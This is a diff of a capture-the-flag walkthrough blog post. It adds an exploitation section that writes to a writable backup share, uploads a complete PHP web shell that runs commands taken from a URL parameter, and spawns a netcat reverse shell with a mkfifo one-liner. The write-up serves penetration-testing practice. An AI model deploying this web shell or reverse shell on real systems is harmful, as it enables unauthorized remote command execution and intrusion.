@@ -208,8 +208,11 @@ cd /mnt/new_backup
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e75be6c2-5086-4a39-916c-b5c82afe47d3)
 
-cool cool, we can now view the contents of that directory, which means we have read and write access.
+cool cool, we can now view the contents of that directory, which means we have read and write access. Lets exploit this
 
+
+
+# Exploitation
 Lets modify the contents of the ```index.html``` file, then we'll head over to the webpage to see if it works
 
 ```
@@ -223,14 +226,59 @@ Navigating to the webpage
 
 Worked hehe.
 
-Lets inject our reverse shell into this 
+Lets upload a php revshell to this directory
 
-command:```echo "
+payload
+```php
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+<script>document.getElementById("cmd").focus();</script>
+</html>
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3dbbf55b-b5b4-4206-b7c0-884a6c8fc862)
+
+Now that we've sent this, lets access it from the webpage
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/db62d9d8-3760-46b5-94b1-67eb10dbab4f)
+
+smooth😅
+
+Lets spawn a reverse shell
+
+payload:```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f```
+
+Ensure you provide your ```LHOST``` and ```LPORT```
+
+Set up your netcat listener also,
+
+Executing the payload
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e4b25531-6dac-457b-a4b6-b72802dc7a31)
+
+Checking our netcat listener
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5f70718a-8bc1-41f0-ab27-85392b2adc19)
+
+We spawned a user shell, lets go ahead and escalate our privileges
 
 
 
 
-
+# Privilege Escalation
 
 
 
